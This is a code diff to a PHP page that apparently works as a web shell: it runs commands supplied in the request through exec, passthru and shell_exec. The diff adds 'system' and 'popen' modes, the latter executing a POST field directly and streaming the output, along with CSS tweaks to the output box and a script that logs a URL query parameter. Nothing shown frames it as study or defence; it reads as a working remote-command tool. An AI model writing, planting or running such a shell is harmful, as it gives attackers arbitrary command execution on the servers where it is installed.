@@ -32,6 +32,13 @@
             padding: 10px;
             border-radius: 5px;
             font-size: 15px;
+
+            max-width: 90vw;
+        }
+
+        .code pre {
+            white-space: pre-line;
+            word-wrap: break-word;
         }
     </style>
 
@@ -63,8 +70,7 @@
 
                     switch ($exec) {
                         case "exec":
-                            exec($cmd, $out);
-                            print_r($out);
+                            echo exec($cmd);
                             break;
 
                         case "passthru":
@@ -74,6 +80,19 @@
                         case "shell_exec":
                             echo shell_exec($cmd);
                             break;
+
+                        case "system":
+                            system($cmd);
+                            break;
+
+                        case "popen":
+                            $proc = popen($_POST['popen_cmd'], 'r');
+                            while (!feof($proc)) {
+                                echo fread($proc, 4096);
+                                @ flush();
+                            }
+                            pclose($proc);
+                            break;
                     }
 
                 }
@@ -81,8 +100,9 @@
             </pre>
         </div>
     </div>
-
-
+    <script>
+        console.log(window.location.search.substr(1).split("&")[0].split("=")[1]);
+    </script>
 </body>
 </html>
 <?php
